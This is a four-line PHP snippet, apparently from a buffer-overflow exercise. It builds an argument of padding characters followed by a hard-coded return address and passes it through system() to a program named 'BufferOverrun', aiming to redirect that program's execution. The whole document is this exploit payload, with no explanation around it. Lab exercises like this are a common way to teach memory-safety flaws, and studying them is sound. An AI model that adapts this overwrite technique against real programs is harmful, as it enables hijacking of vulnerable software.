$arg = "ABCDEFGHIJKLMNOP"."\x90\x10\x40\x00";
$arg = "ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890123"."\x90\x10\x40\x00";
$cmd = "BufferOverrun ".$arg;
system($cmd);

